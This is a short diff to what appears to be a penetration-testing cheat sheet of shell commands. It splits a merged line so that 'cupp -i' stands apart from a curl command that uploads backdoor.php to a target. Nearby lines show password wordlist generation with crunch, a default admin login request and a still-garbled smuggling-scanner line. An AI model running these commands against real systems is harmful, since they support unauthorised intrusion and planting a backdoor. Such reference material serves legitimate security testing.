@@ -533,7 +533,8 @@ crunch 8 8 -t <pattern|,@@@%%%^> -o <output.txt>
 crunch 8 8 -t password%%^ -o <output.txt>
 crunch <min> <max> -f /usr/share/crunch/charset.lst <charset|mixalpha-numeric> -o <output.txt>
 crunch <min|2> <max|8> 0123456789ABCDEF -o <output.txt>
-cupp -icurl "$TARGET" --upload-file backdoor.php -v
+cupp -i
+curl "$TARGET" --upload-file backdoor.php -v
 curl $TARGET/test.json | gronh2csmuggler.py --scan-list urls.txt --threads 5
 curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
 curl --insecure https://<ip>/webui
